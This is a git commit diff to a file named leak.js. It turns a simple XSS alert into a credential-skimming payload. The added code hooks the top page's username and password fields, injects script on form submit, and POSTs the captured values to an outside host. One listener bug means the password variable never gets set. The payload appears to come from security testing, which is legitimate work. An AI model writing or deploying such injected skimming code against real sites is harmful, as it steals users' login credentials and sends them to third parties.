f0553f523f6beba2d4bf017278dc9b1f723186bf
Martin Farias <martin.farias@booking.com>
2019-04-05 11:54:15 +0200

    instrument leak

--- leak.js
+++ leak.js
@@ -1,1 +1,29 @@
-alert('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');
+// alert('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');
+console.log('Wow! Origin: '+location.origin+'\nUrl: '+top.location.href+'?');
+
+f = document.createElement("iframe");
+f.id = "pwn";
+f.src = "/";
+let user;
+let pw;
+
+f.onload = () => {
+  top.username.addEventListener('change', e => user = e.target.value);
+  top.password.addEventListener('change', e => user = e.target.value);
+  top.document.forms[0].addEventListener('submit', () => {
+    x = document.createElement('script');
+    x.src = 'data:,alert("Pwned "+user+" "+pw)';
+    pwn.contentWindow.document.body.appendChild(x)
+    alert('Wow!, submitted user password ' + user + ' ' + pw);
+
+    fetch('https://jsonplaceholder.typicode.com/posts', {
+      method: 'POST',
+      headers: {'Accept': 'application/json', 'Content-Type': 'application/json' },
+      body: JSON.stringify({a: user, b: pw})
+    }).then(resp => {
+      console.log(resp.json());
+    })
+  })
+};
+
+document.body.appendChild(f);
